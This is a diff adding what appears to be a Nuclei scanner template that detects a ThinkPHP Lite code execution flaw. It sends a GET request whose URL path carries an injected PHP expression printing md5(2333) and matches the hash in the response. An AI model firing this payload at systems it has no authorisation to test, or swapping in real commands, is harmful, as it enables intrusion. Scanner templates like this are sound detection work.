@@ -1,0 +1,19 @@
+id: thinkphp-lite-code-exec
+info:
+  name: ThinkPHP Lite Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce,thinkphp
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "56540676a129760a3"
